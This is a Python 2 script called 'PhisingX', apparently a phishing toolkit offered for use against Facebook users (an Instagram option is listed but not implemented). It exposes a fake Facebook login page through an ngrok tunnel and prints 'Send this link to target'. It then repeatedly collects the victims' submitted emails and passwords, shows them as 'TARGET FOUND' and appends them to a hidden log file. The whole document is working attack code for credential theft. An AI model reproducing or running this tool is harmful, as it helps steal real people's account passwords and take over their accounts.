#!/bin/python2
#coding: utf-8

import os, sys, time, base64, requests, yaml, urllib, json, datetime, random
from random import choice

time.sleep(2)
print("\n[{}] Running script PhisingX in linux ...".format(datetime.datetime.now().strftime("%H:%M:%S")))
time.sleep(2)
os.system("clear")
print("""
██████╗ ██╗  ██╗██╗███████╗██╗███╗   ██╗ ██████╗ ██╗  ██╗
██╔══██╗██║  ██║██║██╔════╝██║████╗  ██║██╔════╝ ╚██╗██╔╝
██████╔╝███████║██║███████╗██║██╔██╗ ██║██║  ███╗ ╚███╔╝ 
██╔═══╝ ██╔══██║██║╚════██║██║██║╚██╗██║██║   ██║ ██╔██╗ 
██║     ██║  ██║██║███████║██║██║ ╚████║╚██████╔╝██╔╝ ██╗
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝

\tMade By: VinsDeveloper | Version: 2.0.0-dev\n\n[01] Phising Facebook\n[02] Phising Instagram\n[03] Exit\n
""")
try:
  while True:
    getYourIp = json.load(urllib.urlopen("http://ip-api.com/json"))
    consoleChoice = raw_input("phisingx@{} ~ # ".format(getYourIp["query"]))
    if consoleChoice == "01" or consoleChoice == "1" or consoleChoice == "Facebook" or consoleChoice == "facebook":
      try:
        getUrl = json.load(urllib.urlopen("http://127.0.0.1:4040/api/tunnels"))
        for i in getUrl["tunnels"]:
          save_config = open("login/facebook/config.php", "w")
          save_config.write("<?php $url = 'http://{}'; ?>".format(i["public_url"][6:]))
          save_config.close()
          print("\n[*] Send this link to target: http://{}/login/facebook\n".format(i["public_url"][6:]))
          print("\n[*] Wait for target, CTRL + C to stopped system!\n")
          while True:
            try:
              getData = json.load(urllib.urlopen("http://localhost:8080/login/facebook/targets.json"))
              message = "\n===== [ !TARGET FOUND! ] =====\n -> Email: {}\n -> Password: {}\n -> Found On: {}\n -> Encrypt Password: {}\n".format(getData[u"email"], getData[u"password"], datetime.datetime.now().strftime("%H:%M:%S"), base64.b64encode(getData[u"password"]))
              print(message)
              save_data = open(".data.log", "a")
              save_data.write(message)
              save_data.close()
              time.sleep(2)
            except ValueError:
              pass
      except IOError:
        print("\n[{}] Localhost has been offline!".format(datetime.datetime.now().strftime("%H:%M:%S")))
        break
    elif consoleChoice == "03" or consoleChoice == "3" or consoleChoice == "Exit" or consoleChoice == "exit":
      print("\n[{}] Bye Bye ^_^".format(datetime.datetime.now().strftime("%H:%M:%S")))
      break
    else:
      print("\n[{}] Input not found!".format(datetime.datetime.now().strftime("%H:%M:%S")))
except IOError:
  print("\n[{}] No connection!".format(datetime.datetime.now().strftime("%H:%M:%S")))
except KeyboardInterrupt:
  print("\n[{}] Bye Bye ^_^".format(datetime.datetime.now().strftime("%H:%M:%S")))